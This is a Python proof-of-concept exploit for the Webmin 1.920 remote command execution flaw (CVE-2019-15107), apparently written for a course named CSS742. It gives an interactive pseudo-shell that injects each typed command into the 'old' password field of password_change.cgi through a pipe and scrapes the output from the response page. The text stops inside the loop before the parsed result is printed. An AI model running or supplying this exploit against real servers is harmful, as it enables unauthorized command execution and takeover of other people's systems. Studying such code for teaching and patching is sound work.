#!/bin/python 

"""
Webmin - 1.920 PoC created for CSS742 
Author: choi
"""

from bs4 import BeautifulSoup as bs
import sys
import requests 

# Quick argparse without argparse as this is a PoC 
if len(sys.argv) < 2:
    print("Usage: python3 css742-webmin-poc.py <url>\n")
    print("ex: python3 css742-webmin-poc.py http://localhost:10000")
    exit(1)

# User provided url successfully 
url = sys.argv[1]
target_url = url+"/password_change.cgi"

print("\n[[[ Webmin-1.920 CVE-2019-15107 PoC ]]]")
print("[[[ Created for CSS742 ]]]")

print("\n<Target>: " + url)
print("Enjoy the shell!\n")

# Psuedo shell begins 
while True:
    userinput = input(">> ")

    if userinput == "exit" or userinput=="quit":
        exit(1)

    elif userinput == "":
        continue

    # Build POST Parameter with userinput as a payload 
    data = {
        'user': 'wheel',
        'pam': '',
        'expired': '2',
        'old' : 'id|' + userinput,
        'new1': 'wheel',
        'new2': 'wheel'
    }

    # Build arbitrary headers 
    headers = {
        'Cookie': 'redirect=1; testing=1; sid=x; sessiontest=1;',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': url+'/session_login/.cgi'
    }

    res = requests.post(target_url, data=data, headers=headers)
    soup = bs(res.content,'html.parser')

    # Find location of where the output is shown. Remove all previous gibberish.
    result = soup.find('h3').get_text()
    loc = result.find('incorrect') + 9
    result = result[loc:]
